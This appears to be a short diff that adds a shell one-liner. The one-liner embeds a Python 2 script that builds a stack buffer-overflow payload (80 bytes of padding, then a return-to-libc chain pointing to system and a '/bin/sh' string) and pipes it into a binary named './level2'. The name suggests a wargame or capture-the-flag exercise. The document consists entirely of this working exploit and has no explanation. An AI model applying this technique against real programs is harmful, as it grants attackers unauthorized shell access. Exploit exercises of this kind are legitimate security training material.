@@ -1,0 +1,10 @@
+( python2 - <<'PY'
+import sys, struct
+payload = "A"*80
+payload += struct.pack("<I", 0x0804853e)  # fake ret
+payload += struct.pack("<I", 0xb7e6b060)  # system
+payload += "AAAA"  # ret for fake ret
+payload += struct.pack("<I", 0xb7f8cc58)  # "/bin/sh"
+sys.stdout.write(payload + "\n")
+PY
+cat ) | ./level2
